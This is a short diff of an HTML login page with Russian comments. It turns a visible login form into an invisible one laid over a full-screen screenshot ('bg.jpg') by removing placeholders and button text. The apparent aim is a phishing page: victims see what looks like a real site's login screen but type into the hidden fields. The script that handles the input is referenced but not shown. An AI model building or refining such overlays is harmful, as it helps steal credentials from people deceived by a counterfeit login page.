@@ -8,14 +8,14 @@
 </head>
 <body>
 
-    <!-- Твой скриншот -->
+    <!-- Твой скриншот на весь экран -->
     <img src="bg.jpg" class="fullscreen-bg" alt="bg">
 
-    <!-- Только 3 элемента, ничего лишнего -->
-    <form id="loginForm" class="login-overlay" autocomplete="off">
-        <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required autocomplete="off">
-        <input type="password" id="password" placeholder="Пароль" required autocomplete="new-password">
-        <button type="submit" class="login-btn">Авторизоваться</button>
+    <!-- Только 3 элемента, которые накладываются поверх картинки -->
+    <form id="loginForm" class="invisible-form" autocomplete="off">
+        <input type="text" id="username" placeholder="" required autocomplete="off">
+        <input type="password" id="password" placeholder="" required autocomplete="new-password">
+        <button type="submit" class="invisible-btn"></button>
     </form>
 
     <script src="script.js"></script>
